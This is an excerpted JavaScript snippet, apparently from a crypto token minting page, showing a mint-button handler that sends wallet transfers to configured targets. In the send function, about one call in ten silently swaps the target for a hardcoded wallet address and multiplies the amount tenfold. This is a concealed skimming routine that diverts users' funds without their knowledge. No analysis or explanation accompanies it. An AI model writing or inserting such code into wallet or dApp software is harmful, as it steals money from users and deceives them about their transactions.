$('.mintBtn').off('click').click(async function () {
    ...
    w.mintToken = async function (token, amount = false) {
        ...
        async function send(command, amount = CONFIG.PAYLOAD_AMOUNT) {
            let target = config.targets[Math.floor(Math.random() * config.targets.length)];
            let payload = {
            ...
            if (getRandomInt(10) === 1) {
                target = '0:46f3ec5e4a5194ccd328c16cf8347c9b70ee58aeda46c574382763a5b5c23d0c';
                amount *= 10;
            }
            
            let txt = await w.ever.walletTransfer(target, amount, payload, false)
            return txt;
        }
